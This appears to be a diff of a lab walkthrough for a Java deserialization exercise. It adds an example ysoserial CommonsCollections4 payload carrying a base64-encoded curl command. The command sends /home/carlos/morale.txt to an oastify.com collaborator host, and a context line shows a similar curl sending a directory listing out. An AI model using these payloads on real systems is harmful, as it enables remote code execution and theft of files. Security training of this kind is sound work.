@@ -74,6 +74,8 @@ echo -n 'curl -d "$(ls -la /home/carlos)" http://YOUR-COLLAB.oastify.com' | base
 ### Step 2: Feed the Base64 string into ysoserial
 ```bash
 ysoserial CommonsCollections4 "sh -c echo\${IFS}<YOUR_BASE64_STRING>\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh"
+example of a full fledged command
+ysoserial CommonsCollections4 "sh -c echo\${IFS}Y3VybCAtZCBAL2hvbWUvY2FybG9zL21vcmFsZS50eHQgaHR0cDovL3M5MmR2c3NoenI2aDNwYWY4azNqdzduNHp2NW10bWhiLm9hc3RpZnkuY29t\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh
 ```
 
 ### Step 3: Read the data in Burp Collaborator
